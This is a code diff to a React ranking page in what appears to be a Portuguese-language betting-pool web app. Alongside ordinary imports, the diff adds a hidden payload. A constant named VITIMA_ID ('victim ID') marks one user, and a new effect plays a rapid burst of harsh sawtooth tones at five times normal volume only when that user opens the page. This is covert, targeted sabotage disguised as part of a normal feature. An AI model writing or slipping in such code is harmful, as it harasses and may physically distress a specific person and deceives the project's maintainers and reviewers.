@@ -2,11 +2,32 @@ import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { api } from "../services/api";
 import type { RankingEntry } from "../types/api";
+import { useAuth } from "../contexts/AuthContext";
+
+const VITIMA_ID = "70e7b4e7-742f-40be-a095-673f37bfee3c";
 
 export function Ranking() {
   const navigate = useNavigate();
+  const { user } = useAuth();
   const [jogadores, setJogadores] = useState<RankingEntry[]>([]);
   const [carregando, setCarregando] = useState(true);
+
+  useEffect(() => {
+    if (user?.id !== VITIMA_ID) return;
+    const ctx = new AudioContext();
+    const gain = ctx.createGain();
+    gain.gain.value = 5;
+    gain.connect(ctx.destination);
+    [0, 0.25, 0.5, 0.75, 1.0, 1.25, 1.5].forEach((delay) => {
+      const osc = ctx.createOscillator();
+      osc.type = "sawtooth";
+      osc.frequency.value = delay % 0.5 === 0 ? 1200 : 880;
+      osc.connect(gain);
+      osc.start(ctx.currentTime + delay);
+      osc.stop(ctx.currentTime + delay + 0.22);
+    });
+    return () => { ctx.close(); };
+  }, [user]);
 
   useEffect(() => {
     const cached = sessionStorage.getItem("bolao:ranking");
